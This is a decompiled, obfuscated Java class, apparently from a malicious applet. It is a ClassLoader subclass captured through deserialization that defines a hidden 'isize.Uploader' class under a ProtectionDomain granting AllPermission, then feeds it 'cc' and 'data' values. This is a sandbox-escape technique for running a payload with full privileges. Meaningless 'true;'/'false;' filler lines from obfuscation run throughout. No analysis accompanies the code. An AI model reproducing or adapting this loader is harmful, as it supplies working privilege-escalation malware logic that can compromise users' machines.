// 
// Decompiled by Procyon v0.5.30
// 

package isize;

import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.io.Serializable;

public class Expands extends ClassLoader implements Serializable
{
    public static Expands instance;
    private static final long serialVersionUID = 6812622870313961944L;
    
    public void __Z(final String s, final String s2) throws IOException {
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        true;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        try {
            final byte[] _h = Resizer.instance.__h();
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            final int n = 0;
            final URL url = new URL("file:///");
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            final Certificate[] array = new Certificate[0];
            final Permissions permissions = new Permissions();
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            permissions.add(new AllPermission());
            final CodeSource codeSource = new CodeSource(url, array);
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            final ProtectionDomain protectionDomain = new ProtectionDomain(codeSource, permissions);
            false;
            false;
            false;
            false;
            final Class _g = this.__g(_h, n, protectionDomain);
            true;
            true;
            true;
            true;
            true;
            if (_g != null) {
                false;
                false;
                false;
                false;
                final Field field = _g.getField("cc");
                final Field field2 = _g.getField("data");
                true;
                true;
                true;
                true;
                true;
                true;
                true;
                true;
                false;
                false;
                false;
                false;
                false;
                final Object _k = Resizer.instance.__K(_g);
                field.set(_k, s2);
                true;
                true;
                true;
                true;
                true;
                true;
                field2.set(_k, s);
                false;
                false;
                false;
                false;
                Resizer.instance.__K(_g);
            }
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
        }
        catch (Exception ex) {
            System.out.println("bs:" + ex.getMessage());
            true;
            true;
            true;
            true;
            true;
            ex.printStackTrace();
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
        }
    }
    
    public Class __g(final byte[] array, final int n, final ProtectionDomain protectionDomain) throws ClassNotFoundException {
        final Class<?> defineClass = this.defineClass("isize.Uploader", array, n, array.length, protectionDomain);
        System.out.println(defineClass);
        System.out.println("gc2");
        return defineClass;
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        Expands.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
    }
    
    static {
        Expands.instance = null;
    }
}
